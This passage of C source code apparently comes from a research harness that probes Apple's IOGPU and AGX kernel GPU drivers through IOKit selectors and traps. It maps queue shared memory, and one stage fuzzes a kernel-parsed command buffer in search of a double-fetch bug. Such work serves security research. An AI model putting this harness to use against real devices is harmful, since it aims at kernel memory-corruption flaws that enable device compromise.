                LOG("[agx] %-24s OPEN OK type 0x%x conn 0x%x", names[i], types[t], c);
                IOServiceClose(c);
            } else {
                LOG("[agx] %-24s type 0x%x -> 0x%08x", names[i], types[t], kr);
            }
        }
        IOObjectRelease(svc);
    }
    LOG("[v42] done");
}


// V43: replay Metal call sequence on AGXAcceleratorG16P (type 0x100001)
static void p_agx_replay(void) {
    LOG("[v43] AGX Metal-sequence replay");
    io_connect_t c = open_service("AGXAcceleratorG16P", 0x100001);
    if (!c) { LOG("[agx] open type 0x100001 failed"); return; }
    LOG("[agx] conn 0x%x", c);
    uint8_t *in = must_map(0x2000);
    uint8_t *out = must_map(0x1000);
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;

    // sel 9: resource creation (from trace: plain alloc variant)
    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
    *(uint64_t *)(in + 0x00) = 0;
    *(uint64_t *)(in + 0x08) = 0x0000000100010001ULL;
    *(uint64_t *)(in + 0x10) = 0x0000047001000101ULL;
    *(uint64_t *)(in + 0x38) = 1;
    *(uint64_t *)(in + 0x40) = 0x10000;
    size_t osz = 0x100;
    kern_return_t kr = IOConnectCallMethod(c, 9, NULL, 0, in, 104, osc, &nosc, out, &osz);
    LOG("[agx] sel9 alloc -> kr 0x%08x osz 0x%zx out {%016llx %016llx %016llx}",
        kr, osz, *(uint64_t *)out, *(uint64_t *)(out+8), *(uint64_t *)(out+16));

    // sel 14: shmem {0x4000, 0}
    for (uint64_t idx = 0; idx < 2; idx++) {
        uint64_t a[2] = { 0x4000, idx };
        memset(out, 0, 0x1000);
        osz = 0x100; nosc = 0;
        kr = IOConnectCallMethod(c, 14, a, 2, NULL, 0, osc, &nosc, out, &osz);
        LOG("[agx] sel14 {0x4000,%llu} -> kr 0x%08x out {%016llx %016llx %016llx %016llx}",
            idx, kr, *(uint64_t *)out, *(uint64_t *)(out+8), *(uint64_t *)(out+16), *(uint64_t *)(out+24));
    }

    // sel 16: {0x100, 0x28}
    {
        uint64_t a[2] = { 0x100, 0x28 };
        memset(out, 0, 0x1000);
        osz = 0x100; nosc = 0;
        kr = IOConnectCallMethod(c, 16, a, 2, NULL, 0, osc, &nosc, out, &osz);
        LOG("[agx] sel16 -> kr 0x%08x out {%016llx %016llx %016llx %016llx}",
            kr, *(uint64_t *)out, *(uint64_t *)(out+8), *(uint64_t *)(out+16), *(uint64_t *)(out+24));
    }

    // sel 28 {1,1}, sel 17 {1}, sel 8 {1}, sel 15 {2}/{1}
    uint64_t a28[2] = {1,1};
    nosc = 0;
    kr = IOConnectCallMethod(c, 28, a28, 2, NULL, 0, osc, &nosc, NULL, NULL);
    LOG("[agx] sel28 {1,1} -> kr 0x%08x", kr);
    uint64_t a17[1] = {1};
    nosc = 0;
    kr = IOConnectCallMethod(c, 17, a17, 1, NULL, 0, osc, &nosc, NULL, NULL);
    LOG("[agx] sel17 {1} -> kr 0x%08x", kr);
    uint64_t a8[1] = {1};
    nosc = 0;
    kr = IOConnectCallMethod(c, 8, a8, 1, NULL, 0, osc, &nosc, NULL, NULL);
    LOG("[agx] sel8 {1} -> kr 0x%08x", kr);
    uint64_t a15[1] = {2};
    uint64_t o15[2] = {0,0}; uint32_t c15 = 2;
    kr = IOConnectCallScalarMethod(c, 15, a15, 1, o15, &c15);
    LOG("[agx] sel15 {2} -> kr 0x%08x out {%llx %llx}", kr, o15[0], o15[1]);

    // map shmem types
    for (uint32_t mt = 0; mt < 12; mt++) {
        mach_vm_address_t ma = 0; mach_vm_size_t msz = 0;
        kern_return_t km = IOConnectMapMemory64(c, mt, mach_task_self(), &ma, &msz, 0);
        if (!km) LOG("[agx] MapMemory type %u -> %llx size %llx", mt, ma, msz);
    }
    LOG("[v43] done (alive)");
}


// V44: IOGPU submit path — sel6 size discovery, then sel25 submit probes.
static void p_iogpu_submit(void) {
    LOG("[v44] IOGPU submit path");
    io_connect_t c = open_service("IOGPU", 1);
    if (!c) { LOG("[sub] open failed"); return; }
    uint8_t *in = must_map(0x2000);
    uint8_t *out = must_map(0x1000);
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;

    // sel6 new_command_queue: stIn size sweep
    uint64_t qid = 0, qtok = 0;
    for (size_t sz = 0x408; sz <= 0x600 && !qid; sz += 8) {
        memset(in, 0, 0x2000); memset(out, 0, 0x1000);
        size_t osz = 0x10; nosc = 0;
        kern_return_t kr = IOConnectCallMethod(c, 6, NULL, 0, in, sz, osc, &nosc, out, &osz);
        if (kr != 0xe00002c2) {
            LOG("[sub] sel6 stIn 0x%zx -> kr 0x%08x out {%llx %llx}", sz, kr,
                *(uint64_t *)out, *(uint64_t *)(out + 8));
            if (kr == 0) { qid = *(uint64_t *)out; qtok = *(uint64_t *)(out + 8); }
        }
    }
    LOG("[sub] queue: qid %llu tok %llx", qid, qtok);
    if (!qid) { LOG("[sub] no queue, abort"); return; }

    // sel25 submit: count=0 first (no-op?)
    {
        uint64_t sc[4] = { qid, 0, 0, 0 };
        uint64_t sout[2] = {0,0}; uint32_t scnt = 2;
        kern_return_t kr = IOConnectCallScalarMethod(c, 25, sc, 4, sout, &scnt);
        LOG("[sub] sel25 count=0 -> kr 0x%08x out %llx", kr, sout[0]);
    }
    // entrySize discovery: count=1, len sweep (wide)
    for (size_t es = 0x208; es <= 0x4000; es += 8) {
        uint64_t sc[4] = { qid, 0, 1, es };
        memset(in, 0, 0x2000);
        uint64_t sout[2] = {0,0}; uint32_t scnt = 2;
        nosc = 0;
        kern_return_t kr = IOConnectCallMethod(c, 25, sc, 4, in, es, sout, &scnt, NULL, NULL);
        if (kr != 0xe00002c2)
            LOG("[sub] sel25 entrySize 0x%zx -> kr 0x%08x out %llx", es, kr, sout[0]);
        usleep(1000);
    }
    LOG("[v44] done (alive)");
}


// V45: IOGPU.framework end-to-end — device+queue via private C API, then
// dump object internals to locate the queue shmem pointer.
static void p_iogpu_fw(void) {
    LOG("[v45] IOGPU.framework drive");
    void *h = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_NOW);
    if (!h) { LOG("[fw] dlopen failed: %s", dlerror()); return; }
    typedef void *(*CreateDevFn)(void *, uint64_t);
    typedef void *(*CreateQFn)(void *, void *, void *);
    typedef uint32_t (*GetConnFn)(void *);
    CreateDevFn DeviceCreate = (CreateDevFn)dlsym(h, "IOGPUDeviceCreate");
    CreateQFn QueueCreate = (CreateQFn)dlsym(h, "IOGPUCommandQueueCreate");
    GetConnFn GetConnect = (GetConnFn)dlsym(h, "IOGPUDeviceGetConnect");
    LOG("[fw] DeviceCreate %p QueueCreate %p GetConnect %p", DeviceCreate, QueueCreate, GetConnect);
    if (!DeviceCreate || !QueueCreate || !GetConnect) return;

    void *dev = DeviceCreate(NULL, 0);
    LOG("[fw] device %p", dev);
    if (!dev) return;
    LOG("[fw] device connect 0x%x", GetConnect(dev));
    void *q = QueueCreate(dev, NULL, NULL);
    LOG("[fw] queue %p", q);
    if (!q) return;
    // dump queue object — look for shmem pointers
    uint64_t *qo = (uint64_t *)q;
    for (int i = 0; i < 0x40; i += 4)
        LOG("[fw] q+%03x: %016llx %016llx %016llx %016llx", i*8,
            qo[i], qo[i+1], qo[i+2], qo[i+3]);
    // probe each pointer-looking field: readable? dump first bytes
    for (int i = 0; i < 0x40; i++) {
        uint64_t v = qo[i];
        if (v < 0x100000000 || v > 0x300000000ULL) continue;
        vm_region_basic_info_data_64_t info;
        mach_vm_size_t sz; mach_port_t obj; mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
        mach_vm_address_t addr = v;
        kern_return_t kr = mach_vm_region(mach_task_self(), &addr, &sz, VM_REGION_BASIC_INFO_64,
                                          (vm_region_info_t)&info, &cnt, &obj);
        if (kr) continue;
        uint8_t *b = (uint8_t *)(uintptr_t)v;
        LOG("[fw] q+%02x ptr %llx -> region %llx+%llx: %02x %02x %02x %02x %02x %02x %02x %02x",
            i*8, v, addr, (uint64_t)sz, b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]);
    }
    LOG("[v45] done (alive)");
}


// V46: iOS shmem selectors with Metal-traced values (0x4000/0x100 types)
static void p_shmem_probe(void) {
    LOG("[v46] shmem selector probes");
    static const struct { const char *svc; uint32_t type; } conns[] = {
        { "IOGPU", 1 }, { "AGXAcceleratorG16P", 1 }, { "AGXAcceleratorG16P", 0x100001 },
    };
    for (unsigned ci = 0; ci < 3; ci++) {
        io_connect_t c = open_service(conns[ci].svc, conns[ci].type);
        if (!c) { LOG("[sh] %s/%x open failed", conns[ci].svc, conns[ci].type); continue; }
        LOG("[sh] --- %s/%x conn 0x%x", conns[ci].svc, conns[ci].type, c);
        uint8_t *out = must_map(0x1000);
        uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
        static const uint64_t calls[][2] = {
            { 0x4000, 0 }, { 0x4000, 1 }, { 0x100, 0x28 }, { 0x100, 0 },
            { 0x2000, 0 }, { 0x8000, 0 },
        };
        for (unsigned i = 0; i < sizeof(calls)/16; i++) {
            for (uint32_t sel = 14; sel <= 16; sel++) {
                memset(out, 0, 0x1000);
                size_t osz = 0x100; nosc = 0;
                kern_return_t kr = IOConnectCallMethod(c, sel, (uint64_t *)calls[i], 2,
                                                       NULL, 0, osc, &nosc, out, &osz);
                if (kr != 0xe00002c2 && kr != 0xe00002c7)
                    LOG("[sh] sel %u {%llx,%llx} -> kr 0x%08x out {%016llx %016llx %016llx}",
                        sel, calls[i][0], calls[i][1], kr,
                        *(uint64_t *)out, *(uint64_t *)(out+8), *(uint64_t *)(out+16));
            }
        }
        IOServiceClose(c);
    }
    LOG("[v46] done");
}


// V47: dump getter outputs on IOGPU conn (looking for shmem ids/addrs)
static void p_getters(void) {
    LOG("[v47] getter dump");
    io_connect_t c = open_service("IOGPU", 1);
    if (!c) return;
    uint8_t *out = must_map(0x1000);
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    static const struct { uint32_t sel; size_t osz; } gs[] = {
        { 0, 0x40 }, { 1, 0x40 }, { 2, 0x218 }, { 3, 8 }, { 4, 0x20 },
        { 5, 0x10 }, { 16, 8 }, { 21, 0x30 }, { 22, 0x400 }, { 28, 0 },
    };
    for (unsigned i = 0; i < sizeof(gs)/sizeof(gs[0]); i++) {
        memset(out, 0xAA, 0x1000);
        size_t osz = gs[i].osz; nosc = 0;
        uint64_t so[4] = {0,0,0,0}; uint32_t soc = 0;
        kern_return_t kr = IOConnectCallMethod(c, gs[i].sel, NULL, 0, NULL, 0,
                                               so, &soc, gs[i].osz ? out : NULL, &osz);
        LOG("[gt] sel %2u -> kr 0x%08x osz 0x%zx soc %u", gs[i].sel, kr, osz, soc);
        if (kr == 0) {
            uint64_t *q = (uint64_t *)out;
            for (int j = 0; j < 12; j += 4)
                LOG("[gt]   +%02x: %016llx %016llx %016llx %016llx", j*8,
                    q[j], q[j+1], q[j+2], q[j+3]);
            if (soc) LOG("[gt]   scalars: %016llx %016llx", so[0], so[1]);
        }
    }
    LOG("[v47] done");
}


// V48: diff VM regions before/after sel6 queue creation -> find queue shmem
#define MAXREG 4096
static uint64_t g_regions[MAXREG];
static int collect_regions(void) {
    int n = 0;
    mach_vm_address_t addr = 0;
    while (n < MAXREG) {
        mach_vm_size_t sz = 0;
        vm_region_basic_info_data_64_t info;
        mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
        mach_port_t obj;
        kern_return_t kr = mach_vm_region(mach_task_self(), &addr, &sz,
            VM_REGION_BASIC_INFO_64, (vm_region_info_t)&info, &cnt, &obj);
        if (kr) break;
        g_regions[n++] = addr;
        addr += sz;
        if (!sz) break;
    }
    return n;
}
static int region_seen(uint64_t a, int n) {
    for (int i = 0; i < n; i++) if (g_regions[i] == a) return 1;
    return 0;
}
static void p_qshmem(void) {
    LOG("[v48] queue shmem via region diff");
    io_connect_t c = open_service("IOGPU", 1);
    if (!c) return;
    int n0 = collect_regions();
    LOG("[qs] regions before: %d", n0);
    uint8_t *in = must_map(0x2000);
    uint8_t *out = must_map(0x1000);
    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
    size_t osz = 0x10;
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    kern_return_t kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
    LOG("[qs] sel6 -> kr 0x%08x qid %llu tok %llx", kr,
        *(uint64_t *)out, *(uint64_t *)(out + 8));
    // walk again, find new
    mach_vm_address_t addr = 0;
    int found = 0;
    for (;;) {
        mach_vm_size_t sz = 0;
        vm_region_basic_info_data_64_t info;
        mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
        mach_port_t obj;
        kern_return_t k2 = mach_vm_region(mach_task_self(), &addr, &sz,
            VM_REGION_BASIC_INFO_64, (vm_region_info_t)&info, &cnt, &obj);
        if (k2) break;
        if (!region_seen(addr, n0)) {
            uint8_t *b = (uint8_t *)(uintptr_t)addr;
            LOG("[qs] NEW region %llx size %llx: %02x %02x %02x %02x %02x %02x %02x %02x",
                addr, (uint64_t)sz, b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]);
            found++;
        }
        addr += sz;
        if (!sz) break;
    }
    LOG("[qs] new regions: %d", found);
    LOG("[v48] done");
}


// V49: queue shmem structure + doorbell behavior
static void p_qdrive(void) {
    LOG("[v49] queue shmem drive");
    io_connect_t c = open_service("IOGPU", 1);
    if (!c) return;
    uint8_t *in = must_map(0x2000);
    uint8_t *out = must_map(0x1000);
    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
    size_t osz = 0x10;
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    kern_return_t kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
    if (kr) { LOG("[qd] sel6 kr 0x%08x", kr); return; }
    LOG("[qd] qid %llu tok %llx", *(uint64_t *)out, *(uint64_t *)(out + 8));
    // find the two new regions
    mach_vm_address_t pages[4]; int np = 0;
    mach_vm_address_t addr = 0;
    for (;;) {
        mach_vm_size_t sz = 0;
        vm_region_basic_info_data_64_t info;
        mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
        mach_port_t obj;
        if (mach_vm_region(mach_task_self(), &addr, &sz, VM_REGION_BASIC_INFO_64,
                           (vm_region_info_t)&info, &cnt, &obj)) break;
        // shmem regions: exactly 0x4000, shared, not ours (we track by protection+sharing?)
        if (sz == 0x4000 && addr >= 0x100000000 && addr < 0x200000000) {
            uint8_t *b = (uint8_t *)(uintptr_t)addr;
            // heuristic: zero or counter start, and not previously known malloc
            pages[np++] = addr;
        }
        addr += sz;
        if (!sz || np >= 4) break;
    }
    LOG("[qd] candidate pages: %d", np);
    // heuristics unreliable; use the LAST two 0x4000 regions in that range
    if (np < 2) { LOG("[qd] not found"); return; }
    volatile uint32_t *ctrl = (volatile uint32_t *)(uintptr_t)pages[np-1];
    volatile uint32_t *data = (volatile uint32_t *)(uintptr_t)pages[np-2];
    LOG("[qd] ctrl %p data %p", ctrl, data);
    for (int i = 0; i < 16; i += 4)
        LOG("[qd] ctrl+%02x: %08x %08x %08x %08x", i*4, ctrl[i], ctrl[i+1], ctrl[i+2], ctrl[i+3]);
    for (int i = 0; i < 16; i += 4)
        LOG("[qd] data+%02x: %08x %08x %08x %08x", i*4, data[i], data[i+1], data[i+2], data[i+3]);
    // doorbell with no writes
    for (uint64_t db = 1; db <= 3; db++) {
        kern_return_t kt = ioconnect_trap1(c, 1, db);
        LOG("[qd] trap1(1, %llu) -> kr 0x%08x | ctrl now %08x %08x %08x %08x",
            db, kt, ctrl[0], ctrl[1], ctrl[2], ctrl[3]);
        usleep(100000);
    }
    LOG("[v49] done (alive)");
}


// V50: end-to-end submit — queue + 2 resources + command stream in resource B.
// Command stream: commands >= 0x10, header u32 @+0xc (bit31=end, bits29:0=type).
static io_connect_t g_gpu;
static uint64_t g_last_res_off;
static uint32_t gpu_resource(io_connect_t c, uint8_t *buf, uint64_t size) {
    uint8_t *in = must_map(0x1000);
    uint8_t *out = must_map(0x1000);
    memset(in, 0, 0x1000); memset(out, 0, 0x1000);
    *(uint32_t *)(in + 0x00) = 0x80;
    *(uint32_t *)(in + 0x30) = 1;
    *(uint64_t *)(in + 0x38) = (uint64_t)(uintptr_t)buf + size;
    *(uint64_t *)(in + 0x40) = (uint64_t)(uintptr_t)buf;
    *(uint64_t *)(in + 0x48) = size;
    size_t osz = 0x58;
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    kern_return_t kr = IOConnectCallMethod(c, 8, NULL, 0, in, 0x68, osc, &nosc, out, &osz);
    uint32_t rid = *(uint32_t *)(out + 0x24);
    g_last_res_off = *(uint32_t *)(out + 0x00);          // candidate GPUVA offset
    LOG("[sm] resource buf %p sz 0x%llx -> kr 0x%08x rid %u off32 %x", buf, size, kr, rid, g_last_res_off);
    vm_deallocate(mach_task_self(), (vm_address_t)in, 0x1000);
    vm_deallocate(mach_task_self(), (vm_address_t)out, 0x1000);
    return kr ? 0 : rid;
}
static uint64_t g_qid;
static kern_return_t gpu_submit(uint8_t *entry) {
    uint64_t sc[4] = { g_qid, 0, 1, 0x40 };
    uint64_t sout[2] = {0,0}; uint32_t scnt = 1;
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    return IOConnectCallMethod(g_gpu, 25, sc, 4, entry, 0x40, sout, &scnt, NULL, NULL);
}
static void p_submit(void) {
    LOG("[v50] end-to-end submit");
    g_gpu = open_service("IOGPU", 1);
    if (!g_gpu) return;
    // queue
    uint8_t *in = must_map(0x2000);
    uint8_t *out = must_map(0x1000);
    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
    size_t osz = 0x10;
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    kern_return_t kr = IOConnectCallMethod(g_gpu, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
    g_qid = *(uint64_t *)out;
    LOG("[sm] queue kr 0x%08x qid %llu", kr, g_qid);
    if (kr) return;

    uint8_t *bufA = must_map(0x4000);
    uint8_t *bufB = must_map(0x4000);
    memset(bufA, 0x11, 0x4000);
    memset(bufB, 0, 0x4000);
    uint32_t ridA = gpu_resource(g_gpu, bufA, 0x4000);
    uint32_t ridB = gpu_resource(g_gpu, bufB, 0x4000);
    if (!ridA || !ridB) { LOG("[sm] resources failed"); return; }

    uint8_t *entry = must_map(0x1000);
    // stIn size / count matrix for sel 25
    memset(bufB, 0, 0x4000);
    *(uint32_t *)(bufB + 0xc) = 0x80000000;
    memset(entry, 0, 0x1000);
    *(uint32_t *)(entry + 0x00) = ridA;
    *(uint32_t *)(entry + 0x04) = ridB;
    static const size_t oszs[] = { 0, 0x10, 0x40, 0x100 };
    for (unsigned i = 0; i < sizeof(oszs)/sizeof(size_t); i++) {
        uint64_t sc[4] = { g_qid, 0, 1, 0x40 };
        uint64_t so[1] = {0}; uint32_t sc2 = 1;
        uint64_t o2[4] = {0,0,0,0}; uint32_t n2 = 0;
        size_t osz2 = oszs[i];
        memset(out, 0xAA, 0x1000);
        kern_return_t k2 = IOConnectCallMethod(g_gpu, 25, sc, 4, entry, 0x40, so, &sc2,
                                               oszs[i] ? out : NULL, &osz2);
        LOG("[sm] sel25 stOut 0x%zx -> kr 0x%08x scOut %llx osz2 0x%zx", oszs[i], k2, so[0], osz2);
    }
    // trap0 submit (bypasses sel25 wrapper): p1=qid p2=size p3=entryVA p4=outVA
    {
        memset(bufB, 0, 0x4000);
        *(uint32_t *)(bufB + 0xc) = 0x80000000;
        memset(entry, 0, 0x1000);
        *(uint32_t *)(entry + 0x00) = ridA;
        *(uint32_t *)(entry + 0x04) = ridB;
        uint32_t *outw = (uint32_t *)must_map(0x100);
        *outw = 0xdeadbeef;
        kern_return_t kt = ioconnect_trap4(g_gpu, 0, g_qid, 0x40,
                                           (uintptr_t)entry, (uintptr_t)outw);
        LOG("[sm] trap0 submit -> kr 0x%08x outw %08x", kt, *outw);
    }
    // candidate streams
    static const struct { uint32_t hdr; const char *n; } streams[] = {
        { 0x80000000, "just-end" },
        { 0x80000001, "type1-end" },
        { 0x80000002, "type2-end" },
        { 0x00000001, "type1-noend" },
    };
    for (unsigned i = 0; i < sizeof(streams)/sizeof(streams[0]); i++) {
        memset(bufB, 0, 0x4000);
        *(uint32_t *)(bufB + 0xc) = streams[i].hdr;   // command header
        memset(entry, 0, 0x1000);
        *(uint32_t *)(entry + 0x00) = ridA;
        *(uint32_t *)(entry + 0x04) = ridB;
        kr = gpu_submit(entry);
        uint64_t scv = 0; { uint64_t sc[4]={g_qid,0,1,0x40}; uint64_t so[1]={0}; uint32_t sc2=1; uint64_t o2[4]={0,0,0,0}; uint32_t n2=0;
          IOConnectCallMethod(g_gpu, 25, sc, 4, entry, 0x40, so, &sc2, NULL, NULL); scv = so[0]; }
        LOG("[sm] stream %s (hdr %08x) -> kr 0x%08x scOut %llx", streams[i].n, streams[i].hdr, kr, scv);
        usleep(200000);
    }
    LOG("[v50] done (alive)");
}


// V52: full submit with notification queue bound (sel24). sel14 {0x4000,0} ->
// nq; sel6 -> queue; sel24 {qid, nqid}; then trap0/sel25 submit.
static void p_submit2(void) {
    LOG("[v52] submit with notif-queue bound");
    io_connect_t c = open_service("IOGPU", 1);
    if (!c) return;
    uint8_t *in = must_map(0x2000);
    uint8_t *out = must_map(0x1000);
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    kern_return_t kr;

    // notification queue: try a few count values
    uint64_t nqid = 0;
    static const uint64_t cnts[] = { 0x100, 0x1000, 0x4000, 0x40 };
    for (unsigned i = 0; i < sizeof(cnts)/8 && !nqid; i++) {
        uint64_t a[2] = { cnts[i], 0x10 };   // sc[1] = entrySize (was 0 -> invalid)
        memset(out, 0, 0x1000);
        size_t osz = 0x10; nosc = 0;
        kr = IOConnectCallMethod(c, 14, a, 2, NULL, 0, osc, &nosc, out, &osz);
        LOG("[s2] sel14 count 0x%llx -> kr 0x%08x out {%llx, %llx}", cnts[i], kr,
            *(uint64_t *)out, *(uint64_t *)(out + 8));
        if (kr == 0) nqid = *(uint64_t *)(out + 8);
    }
    // command queue
    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
    size_t osz = 0x10; nosc = 0;
    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
    uint64_t qid = *(uint64_t *)out;
    LOG("[s2] sel6 -> kr 0x%08x qid %llu", kr, qid);
    if (kr || !qid || !nqid) { LOG("[s2] missing pieces"); return; }
    // bind
    uint64_t a24[2] = { qid, nqid };
    kr = IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL);
    LOG("[s2] sel24 bind -> kr 0x%08x", kr);

    // resources
    uint8_t *bufA = must_map(0x4000);
    uint8_t *bufB = must_map(0x4000);
    memset(bufA, 0x11, 0x4000);
    memset(bufB, 0, 0x4000);
    g_gpu = c;
    uint32_t ridA = gpu_resource(c, bufA, 0x4000);
    uint32_t ridB = gpu_resource(c, bufB, 0x4000);
    if (!ridA || !ridB) return;

    // trap0 submit — entry variants (+0x10/+0x18 = event/descriptor pointers)
    uint8_t *entry = must_map(0x1000);
    uint8_t *evbuf = must_map(0x1000);
    memset(evbuf, 0, 0x1000);
    uint32_t *outw = (uint32_t *)must_map(0x100);
    static const struct { int p10, p18; const char *n; } ev[] = {
        { 0, 0, "null-ptrs" },
        { 1, 1, "both-valid" },
        { 0, 1, "only-18" },
        { 1, 0, "only-10" },
    };
    // resource B flag variants: +0x16 bit1 (extra/kernel mapping), etc.
    static const uint8_t bflags[][2] = { {0,0}, {0,2}, {0,6}, {0,4}, {0x40,2}, {0,3} };
    for (unsigned f = 0; f < sizeof(bflags)/2; f++) {
        uint8_t *bufC = must_map(0x4000);
        memset(bufC, 0, 0x4000);
        uint8_t *in2 = must_map(0x1000);
        uint8_t *out2 = must_map(0x1000);
        memset(in2, 0, 0x1000); memset(out2, 0, 0x1000);
        *(uint32_t *)(in2 + 0x00) = 0x80;
        *(uint32_t *)(in2 + 0x30) = 1;
        in2[0x14] = bflags[f][0];
        in2[0x16] = bflags[f][1];
        *(uint64_t *)(in2 + 0x38) = (uint64_t)(uintptr_t)bufC + 0x4000;
        *(uint64_t *)(in2 + 0x40) = (uint64_t)(uintptr_t)bufC;
        *(uint64_t *)(in2 + 0x48) = 0x4000;
        size_t osz2 = 0x58;
        uint64_t osc2[4] = {0,0,0,0}; uint32_t nosc2 = 0;
        kern_return_t k9 = IOConnectCallMethod(c, 8, NULL, 0, in2, 0x68, osc2, &nosc2, out2, &osz2);
        uint32_t ridC = *(uint32_t *)(out2 + 0x24);
        if (k9 || !ridC) { LOG("[s2] resB f14 %02x f16 %02x create kr 0x%08x", bflags[f][0], bflags[f][1], k9); continue; }
        *(uint32_t *)(bufC + 0xc) = 0x80000000;
        memset(entry, 0, 0x1000);
        *(uint32_t *)(entry + 0x00) = ridA;
        *(uint32_t *)(entry + 0x04) = ridC;
        *outw = 0xdeadbeef;
        kern_return_t k8 = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
        LOG("[s2] resB f14 %02x f16 %02x rid %u -> trap0 kr 0x%08x outw %08x",
            bflags[f][0], bflags[f][1], ridC, k8, *outw);
        usleep(100000);
    }
    kern_return_t kt = 0;
    for (unsigned i = 0; i < sizeof(ev)/sizeof(ev[0]); i++) {
        memset(bufB, 0, 0x4000);
        *(uint32_t *)(bufB + 0xc) = 0x80000000;
        memset(entry, 0, 0x1000);
        *(uint32_t *)(entry + 0x00) = ridA;
        *(uint32_t *)(entry + 0x04) = ridB;
        if (ev[i].p10) *(uint64_t *)(entry + 0x10) = (uint64_t)(uintptr_t)evbuf;
        if (ev[i].p18) *(uint64_t *)(entry + 0x18) = (uint64_t)(uintptr_t)(evbuf + 0x100);
        *outw = 0xdeadbeef;
        kt = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
        LOG("[s2] trap0 %s -> kr 0x%08x outw %08x", ev[i].n, kt, *outw);
        usleep(100000);
    }
    // sel25 too
    g_qid = qid;
    kr = gpu_submit(entry);
    LOG("[s2] sel25 submit -> kr 0x%08x", kr);
    LOG("[v52] done (alive)");

    // V53: if the submit path opened, fuzz the command stream (resource B is
    // user-writable shmem parsed live by the kernel). Mutator thread = double-fetch.
    if (kt == 0 || kr == 0) {
        LOG("[v53] submit path open — fuzzing command stream");
        // inline mutation + submit loop
        for (long r = 0;; r++) {
            // random command stream: 1-8 commands with typed headers
            int ncmd = 1 + frand() % 8;
            int off = 0;
            for (int c2 = 0; c2 < ncmd && off < 0x3f0; c2++) {
                uint32_t type = frand() % 8;
                uint32_t hdr = (frand() & 1) ? (0x80000000 | type) : type;
                if (frand() & 1) hdr |= 0x40000000;      // modifier bit
                *(uint32_t *)(bufB + off + 0xc) = hdr;
                // body: semi-structured (shmemOffset-ish fields)
                int bodyw = frand() % 6;
                for (int w = 0; w < bodyw; w++)
                    *(uint32_t *)(bufB + off + w * 4) = (frand() & 3) ? (uint32_t)frand() : (uint32_t)(frand() % 0x1000);
                off += 0x10 + (frand() % 4) * 0x10;
            }
            *(uint32_t *)(bufB + 0xffc) = 0x80000000;    // trailing end marker
            kern_return_t k2 = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
            if (k2 != 0 && k2 != 0xe00002bc && k2 != 0xe00002c2 && (r & 0x3f) == 0)
                LOG("[v53] r%ld kr 0x%08x outw %08x", r, k2, *outw);
            if ((r & 0x1ff) == 0) usleep(1000);
        }
    }
}


// V54: valid stream via sel12 shmems. entry rids = sel12 shmem ids!
// A = kernel command shmem, B = segment list shmem.
static uint32_t gpu_shmem(io_connect_t c, uint64_t size, uint8_t **va_out) {
    uint8_t *out = must_map(0x1000);
    memset(out, 0, 0x1000);
    uint64_t a[2] = { size, 0 };
    size_t osz = 0x10;
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    kern_return_t kr = IOConnectCallMethod(c, 12, a, 2, NULL, 0, osc, &nosc, out, &osz);
    uint64_t va = *(uint64_t *)out;
    uint32_t id = *(uint32_t *)(out + 0xc);
    LOG("[s4] sel12 size 0x%llx -> kr 0x%08x va %llx id %u", size, kr, va, id);
    if (kr) return 0;
    *va_out = (uint8_t *)(uintptr_t)va;
    return id;
}
static void p_submit3(void) {
    LOG("[v54] valid-stream submit");
    io_connect_t c = open_service("IOGPU", 1);
    if (!c) return;
    uint8_t *in = must_map(0x2000);
    uint8_t *out = must_map(0x1000);
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    // notif queue + queue + bind
    uint64_t a14[2] = { 0x100, 0x10 };
    size_t osz = 0x10; nosc = 0;
    kern_return_t kr = IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
    uint64_t nqid = *(uint64_t *)(out + 8);
    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
    osz = 0x10; nosc = 0;
    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
    uint64_t qid = *(uint64_t *)out;
    uint64_t a24[2] = { qid, nqid };
    kern_return_t kb = IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL);
    LOG("[s4] setup: nq %llu qid %llu bind 0x%08x", nqid, qid, kb);
    if (!qid || !nqid || kb) return;

    uint8_t *vaA, *vaB;
    uint32_t idA = gpu_shmem(c, 0x4000, &vaA);
    uint32_t idB = gpu_shmem(c, 0x4000, &vaB);
    if (!idA || !idB) return;

    uint8_t *entry = must_map(0x1000);
    uint32_t *outw = (uint32_t *)must_map(0x100);

